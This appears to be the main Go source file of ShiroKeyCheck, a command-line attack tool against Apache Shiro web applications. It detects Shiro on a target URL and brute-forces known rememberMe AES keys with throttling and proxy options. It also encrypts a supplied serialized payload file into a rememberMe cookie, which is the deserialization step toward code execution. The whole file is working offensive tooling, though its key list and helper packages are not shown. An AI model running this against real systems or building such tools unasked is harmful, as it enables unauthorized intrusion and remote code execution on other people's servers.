package main

//CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o ShiroKeyCheckLinux main.go
//CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o ShiroKeyCheck.exe main.go
//go build -ldflags="-s -w" -o ShiroKeyCheck main.go && upx -9 server
import (
	"ShiroKeyCheck/AES_Encrypt"
	"ShiroKeyCheck/Function"
	"ShiroKeyCheck/GlobalVar"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
	"time"

	"github.com/briandowns/spinner"
)

func GetCommandArgs() {
	flag.StringVar(&GlobalVar.UserAgent, "ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", "User-Agent")
	flag.StringVar(&GlobalVar.Url, "u", "", "Target url（Needed）")
	flag.StringVar(&GlobalVar.Method, "m", "GET", "Request Method")
	flag.StringVar(&GlobalVar.PostContent, "content", "", "POST Method Content")
	flag.IntVar(&GlobalVar.Timeout, "timeout", 60, "Request timeout time(s)")
	flag.IntVar(&GlobalVar.Interval, "interval", 0, "Each request interval time(s)")
	flag.StringVar(&GlobalVar.HttpProxy, "proxy", "", "Set up http proxy e.g. http://127.0.0.1:8080")
	flag.StringVar(&GlobalVar.Pointkey, "key", "", "Specify the key and use CBC and GCM modes for detection")
	flag.StringVar(&GlobalVar.Aes_mode, "mode", "", "Specify CBC or GCM encryption mode (only valid for -ser parameter)")
	flag.StringVar(&GlobalVar.SerFile, "ser", "", "Encrypt the bytecode file to generate the RememberMe field")

	flag.Parse()
}

func ShiroCheck() {
	if !Function.HttpRequset("wotaifu") {
		fmt.Println("Shiro Exist!")
	} else {
		fmt.Println("Shiro Not Exist!")
		os.Exit(1)
	}
}
func KeyCheck() {
	Content, _ := base64.StdEncoding.DecodeString(GlobalVar.CheckContent)
	//指定key的检测
	if GlobalVar.Pointkey != "" {
		time.Sleep(time.Duration(GlobalVar.Interval) * time.Second) //设置请求间隔
		if !Function.FindTheKey(GlobalVar.Pointkey, Content) {
			fmt.Println("Key is incorrect!")
		}
	} else {
		//检测所有key
		isFind := false
		for i := range GlobalVar.Shirokeys {
			time.Sleep(time.Duration(GlobalVar.Interval) * time.Second) //设置请求间隔
			isFind = Function.FindTheKey(GlobalVar.Shirokeys[i], Content)
			if isFind {
				break
			}
		}
		if !isFind {
			fmt.Println("Key not found..")
		}
	}
}
func RememberMeGen() {
	Content, _ := ioutil.ReadFile(GlobalVar.SerFile)
	if GlobalVar.Pointkey == "" {
		fmt.Println("[Error] You must specify the -key parameter!")
		os.Exit(1)
	}
	key, _ := base64.StdEncoding.DecodeString(GlobalVar.Pointkey)
	if strings.ToUpper(GlobalVar.Aes_mode) == "CBC" {
		RememberMe := AES_Encrypt.AES_CBC_Encrypt(key, Content) //AES CBC加密
		fmt.Println("[+] rememberMe=", RememberMe)
	} else if strings.ToUpper(GlobalVar.Aes_mode) == "GCM" {
		RememberMe := AES_Encrypt.AES_GCM_Encrypt(key, Content) //AES GCM加密
		fmt.Println("[+] rememberMe=", RememberMe)
	} else {
		fmt.Println("[Error] Please specify the correct encryption mode, CBC or GCM!(-mode)")
		os.Exit(1)
	}
}
func main() {
	GetCommandArgs()

	if GlobalVar.SerFile != "" {
		//反序列化，rememberMe字段生成
		RememberMeGen()
	} else {
		if GlobalVar.Url != "" {
			s := spinner.New(spinner.CharSets[33], 100*time.Millisecond, spinner.WithWriter(os.Stderr))
			s.Start()
			ShiroCheck() //检测是否存在shiro
			KeyCheck()   //key的检测
			s.Stop()
		} else {
			flag.Usage()
			fmt.Println("[Error] Url must be specified.(-url)")
			os.Exit(1)
		}

	}

}
